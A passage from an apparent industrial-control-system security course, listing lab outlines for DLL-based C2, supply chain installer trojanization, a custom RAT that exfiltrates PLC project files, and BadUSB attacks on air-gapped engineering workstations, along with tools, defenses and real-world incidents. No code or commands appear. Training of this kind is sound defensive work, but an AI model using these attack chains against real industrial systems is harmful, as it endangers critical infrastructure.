5.​ Implement C2 communication from DLL
6.​ Test detection with EDR tools

Lab 3: Supply Chain Attack Simulation
Objective: Demonstrate software update compromise
Setup:
●​ Mock vendor update server (Apache)
●​ Legitimate software installer
●​ Code-signing certificate (self-signed for lab)
Attack Chain:
1.​ Compromise update server (simulate)
2.​ Trojanize software installer
3.​ Sign with code-signing certificate
4.​ Distribute to "customers"
5.​ Monitor infection and C2 beaconing
6.​ Implement detection controls

Lab 4: ICS RAT Development
Objective: Build custom RAT for EWS
Features:
●​
●​
●​
●​
●​

Enumerate installed ICS software
Extract PLC connection profiles
Screenshot engineering interfaces
Exfiltrate project files
Implement stealthy C2 (DNS, HTTPS)

Lab 5: USB Attack on Air-Gapped EWS
Objective: Use BadUSB to compromise isolated workstation
Hardware: Rubber Ducky or DigiSpark

Payload:
●​
●​
●​
●​

Emulate keyboard
Execute PowerShell dropper
Deploy persistence
Exfiltrate data via USB storage

10. Tools & Resources
Supply Chain Analysis
●​
●​
●​
●​

VirusTotal: Check installer hashes
Any.run: Sandbox analysis
PE-sieve: Detect process tampering
Autoruns: Identify persistence mechanisms

Project File Analysis
●​ TIA Portal Openness API: Programmatic project access
●​ 010 Editor: Hex editor with templates for proprietary formats
●​ python-snap7: Siemens S7 protocol library

DLL Hijacking
●​ Process Monitor: Identify missing DLLs
●​ DLL Export Viewer: Analyze required exports
●​ Visual Studio: Compile malicious DLLs

RAT Development
●​ Metasploit: RAT framework
●​ Covenant: .NET C2 framework
●​ Sliver: Modern C2 platform

Summary
Supply chain and engineering workstation attacks represent critical threat vectors to ICS
environments. Key takeaways:
Attack Surface:
●​
●​
●​
●​

Engineering workstations bridge IT and OT networks
Project files are trusted implicitly
Software updates often lack verification
USB devices bypass network security

Techniques:

●​
●​
●​
●​
●​

Project file infection (Stuxnet approach)
Software installer trojanization (Havex, NotPetya)
DLL hijacking for persistence
Watering hole attacks on ICS communities
BadUSB for air-gapped environments

Defense:
●​
●​
●​
●​
●​
●​

Application whitelisting (AppLocker)
Code-signing verification
Project file integrity monitoring
USB device control
Network segmentation (isolate EWS)
Vendor security partnerships

Real-World Impact:
●​
●​
●​
●​

Havex: 1000+ ICS organizations compromised
NotPetya: $10+ billion in damages
CCleaner: 2.7 million downloads trojanized
SolarWinds: 18,000+ organizations affected

